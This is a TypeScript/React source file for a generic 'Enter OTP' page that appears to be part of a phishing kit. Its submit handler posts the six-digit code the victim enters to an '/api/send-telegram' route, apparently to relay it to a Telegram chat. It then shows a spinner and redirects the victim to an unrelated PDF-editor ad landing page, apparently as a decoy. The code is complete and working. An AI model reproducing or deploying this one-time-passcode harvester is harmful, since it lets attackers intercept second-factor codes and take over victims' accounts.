"use client";

import { useEffect, useState } from "react";

export default function OtpPage() {
  const [digits, setDigits] = useState<string[]>(Array(6).fill(""));
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);        // submitting to API
  const [redirecting, setRedirecting] = useState(false); // spinner before leaving
  const [secondsLeft, setSecondsLeft] = useState(5 * 60);

  // lock scroll when redirecting overlay is shown
  useEffect(() => {
    if (!redirecting) return;
    const { documentElement, body } = document;
    documentElement.classList.add("overflow-hidden");
    body.classList.add("overflow-hidden");
    return () => {
      documentElement.classList.remove("overflow-hidden");
      body.classList.remove("overflow-hidden");
    };
  }, [redirecting]);

  const handleChange = (index: number, value: string) => {
    if (!/^\d?$/.test(value)) return;
    const next = [...digits];
    next[index] = value;
    setDigits(next);
    if (value && index < 5) document.getElementById(`otp-${index + 1}`)?.focus();
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const otp = digits.join("");
    if (otp.length < 6) {
      setError("Please enter all 6 digits");
      return;
    }

    setLoading(true);
    setError(null);

    try {
      const telegramResponse = await fetch("/api/send-telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ otp }),
      });

      if (!telegramResponse.ok) {
        const data = await telegramResponse.json().catch(() => ({}));
        throw new Error(data?.description || "Failed to send OTP to Telegram.");
      }

      // ✅ Success → show spinner overlay, then redirect
      setLoading(false);
      setRedirecting(true);

      // small delay so the spinner is perceptible (adjust 400–1200ms as you like)
      await new Promise((r) => setTimeout(r, 700));

      window.location.href = "https://openpdf.com/lp/edit-pdf.html?uh=OpenPDF:%20Better%20and%20Faster&account=678-774-5919&campaignid=23743194221&adgroupid=200928289808&keyword=adobe%20edit%20pdf&gclid=CjwKCAjw1IHTBhAaEiwA4AYNFvMvOj0a8YUzJCZVWvE7Rhsr-2t5u73nS7zOGidXzxsrl9M0dd9PTxoCLkAQAvD_BwE&source=g&matchtype=e&location=1029654&caid=846852869&gad_source=1&gad_campaignid=23743194221&gbraid=0AAAAAoRIeI3Ibj-lMHBvo6gKPaFBunXkU";
    } catch (err) {
      console.error("Telegram error:", err);
      setError(err instanceof Error ? err.message : "Network error. Try again later.");
      setLoading(false);
    }
  };

  // countdown
  useEffect(() => {
    if (secondsLeft <= 0) return;
    const t = setInterval(() => setSecondsLeft((s) => s - 1), 1000);
    return () => clearInterval(t);
  }, [secondsLeft]);

  const formatTime = (s: number) =>
    `${String(Math.floor(s / 60)).padStart(2, "0")}:${String(s % 60).padStart(2, "0")}`;

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-br from-gray-900 via-black to-gray-800 px-4">
      <div className="max-w-md w-full bg-white/5 backdrop-blur-md rounded-xl p-8 shadow-lg border border-white/10 relative">
        <h2 className="text-2xl font-semibold text-white text-center mb-6">Enter OTP</h2>

        <form onSubmit={handleSubmit} className="flex flex-col items-center space-y-6">
          <div className="flex gap-3">
            {digits.map((digit, i) => (
              <input
                key={i}
                id={`otp-${i}`}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(i, e.target.value)}
                className="w-10 h-12 text-center text-white text-lg bg-white/10 rounded-md outline-none
                           focus:ring-2 focus:ring-blue-500 placeholder-white/50 disabled:opacity-50"
                disabled={loading || redirecting}
              />
            ))}
          </div>

          <div className="text-sm text-white/70">
            Time remaining: <span className="text-white font-mono">{formatTime(secondsLeft)}</span>
          </div>

          {error && <p className="text-red-400 text-sm">{error}</p>}

          <button
            type="submit"
            disabled={loading || redirecting}
            className="w-full bg-blue-600 hover:bg-blue-500 transition text-white py-2 rounded-md
                       disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {loading ? "Submitting…" : redirecting ? "Redirecting…" : "Verify"}
          </button>
        </form>

        {/* Local spinner while redirecting to an external site */}
        {redirecting && (
          <div
            role="status"
            aria-live="polite"
            className="fixed inset-0 z-[9999] grid place-items-center bg-black/60 backdrop-blur-sm"
          >
            <div className="h-12 w-12 rounded-full border-4 border-white/30 border-t-white animate-spin" />
            {/* Optional caption */}
            {/* <p className="mt-4 text-white/90 text-sm">Redirecting…</p> */}
          </div>
        )}
      </div>
    </div>
  );
}
